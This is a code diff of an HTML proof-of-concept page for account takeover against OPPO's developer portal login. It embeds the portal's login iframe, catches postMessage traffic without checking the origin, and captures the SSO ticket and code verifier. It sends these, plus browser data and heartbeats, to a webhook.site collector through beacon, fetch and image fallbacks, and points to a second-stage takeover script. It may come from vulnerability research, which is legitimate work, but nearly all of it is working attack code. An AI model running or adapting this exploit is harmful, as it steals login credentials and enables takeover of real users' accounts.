@@ -2,28 +2,32 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>OPPO ATO PoC B - click-launched popup-with-iframe</title>
+<title>OPPO ATO PoC A - sandboxed iframe</title>
 <style>
  body{font-family:ui-monospace,Menlo,Consolas,monospace;background:#0b0b0b;color:#9cffb0;padding:14px;margin:0}
  h1{margin:0 0 8px;font-size:15px;color:#fff}
  #status{padding:10px;border:1px solid #333;background:#141414;margin-bottom:10px;font-weight:bold}
  #status.hit{background:#07450e;border-color:#0f0;color:#fff}
  #log{white-space:pre-wrap;border:1px solid #333;padding:8px;background:#141414;height:340px;overflow:auto;font-size:11px}
- button{background:#1976d2;color:#fff;border:0;padding:14px 22px;font-size:16px;cursor:pointer;border-radius:4px;margin-bottom:10px}
- button:hover{background:#1565c0}
+ iframe{border:1px solid #333;display:block;margin-top:10px}
 </style>
 </head>
 <body>
-<h1>OPPO ATO PoC B - popup containing same-origin iframe</h1>
-<button id="go">Click to open content</button>
-<div id="status">click the button to start. user-activation is required so the popup is not blocked.</div>
+<h1>OPPO ATO PoC A - sandboxed iframe (no top-nav escape)</h1>
+<div id="status">initializing...</div>
 <pre id="log"></pre>
+<div id="frameHolder"></div>
 
 <script>
 (function(){
   // ==================== CONFIG ====================
+  // Replace with a fresh webhook.site URL before going live.
   var WEBHOOK = "https://webhook.site/REPLACE-ME-WITH-FRESH-UUID";
 
+  // Build URL in JS to avoid any chance of copy/paste line breaks.
+  // Nested fromLocation so HeyTap redirects the iframe back to a
+  // /user/web-sso/login-iframe URL that re-runs login_iframe.js (the
+  // bridge that postMessages the ticket to window.parent).
   var BASE       = "https://developers.oppomobile.com/user/web-sso/login-iframe";
   var INNER_FROM = BASE + "?fromLocation=x";
   var IFRAME_SRC = BASE + "?fromLocation=" + encodeURIComponent(INNER_FROM);
@@ -40,116 +44,108 @@
     logEl.textContent += s + '\n';
     logEl.scrollTop = logEl.scrollHeight;
   }
+
+  // sendBeacon is critical: it survives page unload (in case top-level
+  // navigation happens despite sandbox). Multi-channel fallback.
   function exfil(label, data){
     var payload = JSON.stringify({label:label, ts:new Date().toISOString(), seq:seq, data:data});
     var sent = false;
-    try { if (navigator.sendBeacon) sent = navigator.sendBeacon(WEBHOOK, payload); } catch(e){}
+    try {
+      if (navigator.sendBeacon) {
+        sent = navigator.sendBeacon(WEBHOOK, payload);
+        if (sent) line('SENT(beacon) '+label, '');
+      }
+    } catch(e){}
     if (!sent) {
-      try { fetch(WEBHOOK, {method:'POST', mode:'no-cors', body:payload, keepalive:true}); }
-      catch(e){
-        try { new Image().src = WEBHOOK + '?label='+encodeURIComponent(label)+'&data='+encodeURIComponent(safe(data)); }
-        catch(e2){}
+      try {
+        fetch(WEBHOOK, {method:'POST', mode:'no-cors', body:payload, keepalive:true});
+        line('SENT(fetch) '+label, '');
+      } catch(e){
+        try {
+          new Image().src = WEBHOOK + '?label='+encodeURIComponent(label)+'&data='+encodeURIComponent(safe(data));
+          line('SENT(img) '+label, '');
+        } catch(e2){ line('EXFIL_FAIL '+label, String(e2)); }
       }
     }
-    line('EXFIL '+label, data);
   }
 
-  exfil('BOOT_OPENER', {href:location.href, ua:navigator.userAgent});
+  // Boot ping — proves webhook wiring works.
+  exfil('BOOT', {
+    href:      location.href,
+    userAgent: navigator.userAgent,
+    innerW:    window.innerWidth,
+    iframeSrc: IFRAME_SRC
+  });
 
-  // We listen on the OPENER window for messages forwarded by the popup.
+  // ===== heartbeat every 1s; ping webhook every 5 ticks =====
+  var hb = 0;
+  setInterval(function(){
+    hb++;
+    if (hb % 5 === 0) exfil('HEARTBEAT', {hb:hb, href:location.href});
+  }, 1000);
+
+  // ===== detect if our top window dies (top-level breakout) =====
+  window.addEventListener('pagehide',     function(e){ exfil('PAGEHIDE',    {persisted:e.persisted, href:location.href}); });
+  window.addEventListener('beforeunload', function( ){ exfil('BEFOREUNLOAD',{href:location.href}); });
+  window.addEventListener('visibilitychange', function(){ exfil('VISIBILITY', {state:document.visibilityState}); });
+
+  // ===== catch every postMessage, no filter =====
   window.addEventListener('message', function(ev){
-    line('OPENER_RECV', {origin:ev.origin, data:ev.data});
-    exfil('OPENER_POSTMESSAGE', {origin:ev.origin, data:ev.data});
+    var rec = {origin: ev.origin, dataType: typeof ev.data, data: ev.data};
+    line('RECV', rec);
+    exfil('POSTMESSAGE', rec);
 
+    // Promote the success case
     var d = ev.data;
-    // Inner forward shape: {kind:'fwd', origin, data}
-    var p = (d && d.kind === 'fwd' && d.data) ? d.data : null;
-    if (!p && d && typeof d === 'object' && d.channel === 'sdk-login-status') p = d.data;
-    if (p && typeof p === 'object' && p.channel === 'sdk-login-status') p = p.data;
-
-    if (p && p.code === 'loginSuccess' && p.ticket) {
-      statusEl.classList.add('hit');
-      statusEl.textContent =
-        'TICKET CAPTURED. Feed to ato_exploit_step2.sh:\n' +
-        'ticket:       ' + p.ticket + '\n' +
-        'codeVerifier: ' + p.codeVerifier;
-      exfil('TICKET_CAPTURED', p);
-    } else if (p && p.code === 'loginSuccess') {
-      exfil('EMPTY_TICKET_NOOP', p);
+    if (d && typeof d === 'object' && d.channel === 'sdk-login-status') {
+      var p = d.data || {};
+      if (p.code === 'loginSuccess' && p.ticket) {
+        statusEl.classList.add('hit');
+        statusEl.textContent =
+          'TICKET CAPTURED. Feed these to ato_exploit_step2.sh:\n' +
+          'ticket:       ' + p.ticket + '\n' +
+          'codeVerifier: ' + p.codeVerifier;
+        exfil('TICKET_CAPTURED', p);
+      } else if (p.code === 'loginSuccess' && !p.ticket) {
+        statusEl.textContent =
+          'SDK returned loginSuccess with EMPTY ticket. Victim is already ' +
+          'signed in to the dev portal. Test in a profile that is signed ' +
+          'OUT of developers.oppomobile.com (clear the openplat cookie).';
+        exfil('EMPTY_TICKET_NOOP', p);
+      } else {
+        exfil('OTHER_SDK_STATUS', p);
+      }
     }
   }, false);
 
-  document.getElementById('go').onclick = function(){
-    statusEl.textContent = 'opening popup...';
-    exfil('CLICK', {});
+  // ===== build the iframe in JS to avoid attribute line-break hazards =====
+  var ifr = document.createElement('iframe');
+  ifr.id = 'f';
+  ifr.width = '500';
+  ifr.height = '620';
+  // Sandbox WITHOUT allow-top-navigation: the SDK's loginPage uses
+  // location.assign() which navigates the iframe itself; this sandbox
+  // explicitly blocks any future SDK change that tries top.location.
+  ifr.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups');
+  ifr.src = IFRAME_SRC;
 
-    // about:blank popups inherit the opener's origin (muj-taba.github.io
-    // here). That gives the popup script same-origin access to the
-    // opener AND it sits as `window.parent` of the iframe we inject.
-    // The iframe's bridge calls window.parent.postMessage(..., "*"),
-    // which our popup script receives, and we forward to the opener.
-    var pop = window.open('about:blank', 'oppo_ato', 'width=900,height=700');
-    if (!pop) {
-      statusEl.textContent = 'popup blocked. allow popups for this site and click again.';
-      exfil('POPUP_BLOCKED', {});
-      return;
+  var loadCount = 0;
+  ifr.addEventListener('load', function(){
+    loadCount++;
+    line('IFRAME_LOAD', {n:loadCount, attr_src:ifr.getAttribute('src')});
+    exfil('IFRAME_LOAD', {n:loadCount, attr_src:ifr.getAttribute('src')});
+    // Probe whether iframe is still on the dev portal origin (will throw
+    // for cross-origin reads, but tells us the navigation completed).
+    try {
+      var u = ifr.contentWindow.location.href;
+      exfil('IFRAME_URL_READABLE', u);
+    } catch(e){
+      exfil('IFRAME_URL_OPAQUE', String(e).slice(0,200));
     }
+  });
 
-    // Build the inner document. Note: the iframe src is built in JS to
-    // avoid HTML-attribute line-break problems.
-    var doc = pop.document;
-    doc.open();
-    doc.write('<!DOCTYPE html><html><head><meta charset="utf-8"><title>...</title></head><body></body></html>');
-    doc.close();
-
-    // Inject the iframe element programmatically into the popup.
-    var ifr = doc.createElement('iframe');
-    ifr.width  = '500';
-    ifr.height = '620';
-    ifr.style.border = '1px solid #333';
-    ifr.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups');
-    ifr.src = IFRAME_SRC;
-
-    // Track loads so we know whether HeyTap's redirect landed back on /login-iframe.
-    var loadCount = 0;
-    ifr.addEventListener('load', function(){
-      loadCount++;
-      try { window.opener && null; } catch(e){}
-      try {
-        // Forward iframe load events to opener via direct webhook (popup may have been moved).
-        navigator.sendBeacon(WEBHOOK, JSON.stringify({
-          label:'POPUP_IFRAME_LOAD', n:loadCount, src:ifr.getAttribute('src'), ts:new Date().toISOString()
-        }));
-      } catch(e){}
-    });
-
-    doc.body.appendChild(ifr);
-
-    // Inject a script INTO the popup that listens for postMessage and forwards
-    // both to the opener (us) and directly to the webhook.
-    var script = doc.createElement('script');
-    script.textContent =
-      "(function(){\n" +
-      "  var WEBHOOK=" + JSON.stringify(WEBHOOK) + ";\n" +
-      "  function ex(label,data){\n" +
-      "    var p=JSON.stringify({label:label,ts:new Date().toISOString(),data:data});\n" +
-      "    try{navigator.sendBeacon(WEBHOOK,p);}catch(e){}\n" +
-      "    try{fetch(WEBHOOK,{method:'POST',mode:'no-cors',body:p,keepalive:true});}catch(e){}\n" +
-      "  }\n" +
-      "  ex('POPUP_BOOT',{href:location.href});\n" +
-      "  window.addEventListener('message',function(ev){\n" +
-      "    var rec={origin:ev.origin,dataType:typeof ev.data,data:ev.data};\n" +
-      "    ex('POPUP_RECV',rec);\n" +
-      "    try{ if(window.opener) window.opener.postMessage({kind:'fwd',origin:ev.origin,data:ev.data},'*'); }catch(e){}\n" +
-      "  },false);\n" +
-      "  window.addEventListener('pagehide',function(e){ex('POPUP_PAGEHIDE',{persisted:e.persisted,href:location.href});});\n" +
-      "  window.addEventListener('beforeunload',function(){ex('POPUP_BEFOREUNLOAD',{href:location.href});});\n" +
-      "  setInterval(function(){ex('POPUP_HB',{href:location.href});},5000);\n" +
-      "})();";
-    doc.body.appendChild(script);
-
-    statusEl.textContent = 'popup open. SDK should run inside it. waiting for postMessage forward...';
-  };
+  document.getElementById('frameHolder').appendChild(ifr);
+  statusEl.textContent = 'iframe injected. Waiting for SDK postMessage...';
 })();
 </script>
 </body>
